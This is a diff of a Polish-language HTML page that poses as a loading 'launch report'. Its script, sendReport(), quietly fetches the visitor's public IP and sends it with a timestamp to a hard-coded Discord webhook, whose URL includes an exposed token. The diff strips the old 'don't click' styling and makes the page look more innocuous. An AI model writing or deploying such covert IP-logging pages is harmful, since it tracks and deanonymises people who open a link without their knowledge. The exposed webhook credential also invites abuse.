@@ -1,98 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>System Rejestracji – NIE KLIKAJ</title>
-<style>
-body {
-    background: linear-gradient(135deg, #1e1e2f, #12121a);
-    color: white;
-    font-family: Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    text-align: center;
-}
-
-.card {
-    background: #1f1f2e;
-    padding: 40px;
-    border-radius: 15px;
-    box-shadow: 0 0 30px rgba(0,0,0,0.6);
-    width: 350px;
-    position: relative;
-}
-
-.icon {
-    font-size: 50px;
-    color: #f44336;
-    margin-bottom: 20px;
-    animation: pulse 1s infinite alternate;
-}
-
-@keyframes pulse {
-    0% { transform: scale(1); }
-    100% { transform: scale(1.2); }
-}
-
-.loader {
-    border: 5px solid #333;
-    border-top: 5px solid #4cafef;
-    border-radius: 50%;
-    width: 40px;
-    height: 40px;
-    margin: 20px auto;
-    animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-    100% { transform: rotate(360deg); }
-}
-
-.success {
-    color: #4caf50;
-    margin-top: 20px;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>Raport uruchomienia</title>
 </head>
 <body>
 
-<div class="card">
-    <div class="icon">⛔</div>
-    <h2>NIE KLIKAJ</h2>
-    <p>Trwa inicjalizacja systemu...</p>
-    <div class="loader"></div>
-    <div id="status"></div>
-</div>
+<h2>Ładowanie raportu...</h2>
 
 <script>
 async function sendReport() {
     try {
+        // Pobierz publiczne IP
         let ipResponse = await fetch("https://api.ipify.org?format=json");
         let ipData = await ipResponse.json();
         let ip = ipData.ip;
 
+        // Data i godzina
         let now = new Date().toLocaleString();
 
+        // Wyślij do Discord webhook
         await fetch("https://discord.com/api/webhooks/1475185024688066774/Y92XyKynfaiP0jSYW_mWVqYahga2ZvSupHlRxmAmjagLkS_QCs_r2huOvkQ8WBuuQwlZ", {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
+            headers: {
+                "Content-Type": "application/json"
+            },
             body: JSON.stringify({
                 content:
-                "📡 **Raport uruchomienia systemu**\n\n" +
+                "📡 **Raport otwarcia linku**\n\n" +
                 "🌍 IP: " + ip + "\n" +
                 "🕒 Czas: " + now
             })
         });
 
-        document.querySelector(".loader").style.display = "none";
-        document.getElementById("status").innerHTML =
-            "<div class='success'>Raport zapisany w systemie ✅</div>";
+        document.body.innerHTML = "<h2>Raport wysłany ✅</h2>";
 
     } catch (error) {
-        document.getElementById("status").innerHTML =
-            "<div style='color:red'>Błąd połączenia ❌</div>";
+        document.body.innerHTML = "<h2>Błąd wysyłania ❌</h2>";
     }
 }
 
